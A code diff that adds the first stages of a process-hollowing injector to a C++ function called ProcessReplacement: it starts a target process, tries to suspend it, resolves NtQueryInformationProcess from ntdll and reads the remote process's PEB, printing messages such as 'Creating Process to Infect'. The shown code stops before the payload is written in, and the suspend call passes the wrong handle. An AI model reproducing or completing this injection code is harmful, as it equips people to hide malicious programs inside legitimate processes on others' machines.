@@ -359,6 +359,98 @@ BOOL ProcessReplacement(TCHAR* target, string inj_exe)
 	auto Parsed_PE = ParsePE(PE_FILE); // get pe_file object
 	std::cout << "[+] Got Info from PE" << std::endl;
 
+	auto pStartupInfo = new STARTUPINFO(); // specifies the window station, desktop, standard handles
+	auto remoteProcessInfo = new PROCESS_INFORMATION(); // Structure that contains the information about process object
+
+	std::cout << "==============Creating Process to Infect==================" << std::endl;
+	std::cout << "[ ] Creating host process" << std::endl;
+
+	CreateProcess(
+		target,
+		nullptr,
+		nullptr,
+		nullptr,
+		FALSE,
+		NORMAL_PRIORITY_CLASS,
+		nullptr,
+		nullptr,
+		pStartupInfo,
+		remoteProcessInfo
+	);
+
+	if (!remoteProcessInfo->hProcess)
+	{
+		std::cout << "[-] Failed to create remote thread" << std::endl;
+		return FALSE;
+	}
+
+	if (SuspendThread(remoteProcessInfo->hProcess) == -1)
+	{
+		std::cout << "[-] Failed to stop remote process" << std::endl;
+		return FALSE;
+	}
+
+	std::cout << "[+] Created host process" << std::endl;
+	DWORD dwRetLength;
+
+	std::cout << "============================================" << std::endl;
+	
+	// Read remote PEB
+	PROCESS_BASIC_INFORMATION ProcessBasicInfo;
+
+	std::cout << "===========Hijacking remote Function=============" << std::endl;
+	// get NtQueryInformationProcess
+	std::cout << "[ ] Loading remote process libraries and functions to build new PEB" << std::endl;
+	std::cout << "[ ] getting ntdll" << std::endl;
+
+	auto handleToRemoteNtDll = LoadLibrary(L"ntdll"); // locate NTDLL in new process memory
+	if (!handleToRemoteNtDll)
+	{
+		std::cout << "[-] Failed to get remote handle to NTDLL" << std::endl;
+		return FALSE;
+	}
+
+	std::cout << "[+] Got handle on NtDll" << std::endl;
+	std::cout << "[ ] Getting NtQueryInformationProcess" << std::endl;
+
+	auto fpNtQueryInformationProcess = GetProcAddress(handleToRemoteNtDll, "NtQueryInformationProcess");
+	if (!fpNtQueryInformationProcess)
+	{
+		std::cout << "[-] Failed to locate remote NtQueryProcessInformation function" << std::endl;
+		return FALSE;
+	}
+
+	std::cout << "[+] Got handle on NtQueryProcessInformation" << std::endl;
+	std::cout << "[ ] Executing NtQueryInformationProcess" << std::endl;
+
+	auto remoteNtQueryInformationProcess = reinterpret_cast<_NtQueryInformationProcess>(fpNtQueryInformationProcess);
+
+	// Call remote process NtQueryInfoProc function
+	remoteNtQueryInformationProcess(
+		remoteProcessInfo->hProcess,
+		PROCESSINFOCLASS(0),
+		&ProcessBasicInfo,
+		sizeof(PROCESS_BASIC_INFORMATION),
+		&dwRetLength
+	);
+	std::cout << "[+] Executed NtQueryInformationProcess" << std::endl;
+
+	auto dwPEBAddr = ProcessBasicInfo.PebBaseAddress; // remote PEB info
+	auto pPEB = new PEB(); // create new PEB object
+
+	std::cout << "[ ] Reading process memory to locate remote PEB" << std::endl;
+	if (!ReadProcessMemory(remoteProcessInfo->hProcess, 
+		static_cast<LPCVOID>(dwPEBAddr), pPEB, sizeof(PEB), nullptr))
+	{
+		std::cout << "[-] Failed to load remote PEB" << std::endl;
+		return FALSE;
+	}
+
+	std::cout << "[+] Read foreign PEB" << std::endl;
+	std::cout << "[+] Parsed remote PEB" << std::endl;
+
+	// Remote image size calculation
+
 	return TRUE;
 }
 
